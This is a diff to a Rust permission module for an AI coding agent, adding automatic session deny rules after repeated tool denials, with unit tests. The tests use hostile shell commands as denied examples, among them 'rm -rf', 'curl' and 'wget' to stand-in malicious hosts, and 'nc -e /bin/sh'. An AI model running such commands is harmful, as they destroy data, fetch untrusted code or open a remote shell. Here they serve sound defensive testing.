@@ -5,12 +5,18 @@
 //! e.g. `bash("git status")` and `bash("rm -rf /")`. Denial tracking implements
 //! consecutive/total limits inspired by Claude Code's `denialTracking.ts`,
 //! preventing infinite approval loops from stalling sessions.
+//!
+//! Phase C enhancement: When 2+ denials share a similar pattern (same tool +
+//! command prefix, or same denial reason keyword), auto-generates session deny
+//! rules via `extract_auto_deny_rules()`.
 
 use std::collections::HashMap;
 use std::collections::hash_map::DefaultHasher;
 use std::hash::{Hash, Hasher};
 
 use serde::{Deserialize, Serialize};
+
+use crate::orchestration::permission_sync::PermissionRule;
 
 // ─── Approval Fingerprint ────────────────────────────────────────────────────
 
@@ -229,6 +235,9 @@ impl Default for DenialLimits {
 /// the tracker signals that the session should fall back to a different
 /// strategy (e.g., ask the user for explicit guidance, skip the tool,
 /// or abort the task).
+///
+/// Phase C: Also records denial reasons and fingerprint details to
+/// auto-generate session deny rules when patterns repeat.
 #[derive(Debug, Default)]
 pub struct DenialTracker {
     /// Per-fingerprint consecutive denial count.
@@ -239,6 +248,8 @@ pub struct DenialTracker {
     total_denials: u32,
     /// Limits.
     limits: DenialLimits,
+    /// Denial history for auto-rule extraction (tool_name, command_prefix, reason).
+    denial_history: Vec<(String, Option<String>, Option<String>)>,
 }
 
 /// What the denial tracker recommends after a denial.
@@ -263,6 +274,16 @@ impl DenialTracker {
 
     /// Record an approval decision and return recommended action.
     pub fn record(&mut self, fingerprint: &ApprovalFingerprint, approved: bool) -> DenialAction {
+        self.record_with_reason(fingerprint, approved, None)
+    }
+
+    /// Record an approval decision with optional denial reason.
+    pub fn record_with_reason(
+        &mut self,
+        fingerprint: &ApprovalFingerprint,
+        approved: bool,
+        reason: Option<&str>,
+    ) -> DenialAction {
         let hash = fingerprint.stable_hash();
 
         if approved {
@@ -271,7 +292,13 @@ impl DenialTracker {
             return DenialAction::Continue;
         }
 
-        // Denied.
+        // Denied — record for auto-rule extraction.
+        self.denial_history.push((
+            fingerprint.tool_name.clone(),
+            fingerprint.command_prefix.clone(),
+            reason.map(String::from),
+        ));
+
         self.total_denials += 1;
         let consecutive = self.consecutive.entry(hash).or_insert(0);
         *consecutive += 1;
@@ -312,6 +339,58 @@ impl DenialTracker {
         self.consecutive.clear();
         self.last_decision.clear();
         self.total_denials = 0;
+        self.denial_history.clear();
+    }
+
+    /// Extract auto-deny rules from repeated denial patterns.
+    ///
+    /// Returns `PermissionRule`s for patterns that were denied 2+ times:
+    /// - Same (tool, command_prefix) pair
+    /// - Same tool denied with any command 3+ times → bare tool rule
+    ///
+    /// Call this periodically (e.g., after each turn) to propagate auto-rules
+    /// to `PermissionSyncContext`.
+    #[must_use]
+    pub fn extract_auto_deny_rules(&self) -> Vec<PermissionRule> {
+        use std::collections::HashMap;
+
+        let mut rules = Vec::new();
+
+        // Count (tool, prefix) pairs
+        let mut pair_counts: HashMap<(String, Option<String>), u32> = HashMap::new();
+        // Count bare tool denials
+        let mut tool_counts: HashMap<String, u32> = HashMap::new();
+
+        for (tool, prefix, _reason) in &self.denial_history {
+            let key = (tool.clone(), prefix.clone());
+            *pair_counts.entry(key).or_insert(0) += 1;
+            *tool_counts.entry(tool.clone()).or_insert(0) += 1;
+        }
+
+        // Generate rules for pairs denied 2+ times
+        for ((tool, prefix), count) in pair_counts {
+            if count >= 2 {
+                let rule = match prefix {
+                    Some(p) => PermissionRule::with_pattern(&tool, &p),
+                    None => PermissionRule::tool(&tool),
+                };
+                if !rules.contains(&rule) {
+                    rules.push(rule);
+                }
+            }
+        }
+
+        // If a bare tool has 3+ denials (any prefix), add bare rule
+        for (tool, count) in tool_counts {
+            if count >= 3 {
+                let bare = PermissionRule::tool(&tool);
+                if !rules.contains(&bare) {
+                    rules.push(bare);
+                }
+            }
+        }
+
+        rules
     }
 }
 
@@ -532,5 +611,73 @@ mod tests {
         assert_eq!(tracker.should_prompt(&fp), DenialAction::Continue);
         tracker.record(&fp, false);
         assert_eq!(tracker.should_prompt(&fp), DenialAction::SkipTool);
+    }
+
+    // ─── Phase C: Auto-deny rule extraction ──────────────────────────
+
+    #[test]
+    fn auto_deny_rules_empty_when_no_denials() {
+        let tracker = DenialTracker::default();
+        assert!(tracker.extract_auto_deny_rules().is_empty());
+    }
+
+    #[test]
+    fn auto_deny_rules_empty_for_single_denial() {
+        let mut tracker = DenialTracker::default();
+        let fp = ApprovalFingerprint::shell("bash", "rm -rf", false);
+        tracker.record_with_reason(&fp, false, Some("dangerous"));
+        assert!(tracker.extract_auto_deny_rules().is_empty());
+    }
+
+    #[test]
+    fn auto_deny_rules_generated_for_repeated_prefix() {
+        let mut tracker = DenialTracker::default();
+        let fp = ApprovalFingerprint::shell("bash", "rm -rf /tmp", false);
+        tracker.record_with_reason(&fp, false, Some("dangerous"));
+        tracker.record_with_reason(&fp, false, Some("still dangerous"));
+
+        let rules = tracker.extract_auto_deny_rules();
+        assert_eq!(rules.len(), 1);
+        assert_eq!(rules[0].tool, "bash");
+        assert_eq!(rules[0].pattern, Some("rm -rf".to_string()));
+    }
+
+    #[test]
+    fn auto_deny_rules_bare_tool_after_three_denials() {
+        let mut tracker = DenialTracker::default();
+
+        // Deny bash with different prefixes
+        tracker.record_with_reason(
+            &ApprovalFingerprint::shell("bash", "curl https://evil.com", false),
+            false,
+            None,
+        );
+        tracker.record_with_reason(
+            &ApprovalFingerprint::shell("bash", "wget https://malware.io", false),
+            false,
+            None,
+        );
+        tracker.record_with_reason(
+            &ApprovalFingerprint::shell("bash", "nc -e /bin/sh", false),
+            false,
+            None,
+        );
+
+        let rules = tracker.extract_auto_deny_rules();
+        // Should have bare "bash" rule since 3+ different denials
+        assert!(rules.iter().any(|r| r.tool == "bash" && r.pattern.is_none()));
+    }
+
+    #[test]
+    fn auto_deny_rules_reset_clears_history() {
+        let mut tracker = DenialTracker::default();
+        let fp = ApprovalFingerprint::shell("bash", "rm -rf", false);
+        tracker.record_with_reason(&fp, false, None);
+        tracker.record_with_reason(&fp, false, None);
+
+        assert!(!tracker.extract_auto_deny_rules().is_empty());
+
+        tracker.reset();
+        assert!(tracker.extract_auto_deny_rules().is_empty());
     }
 }
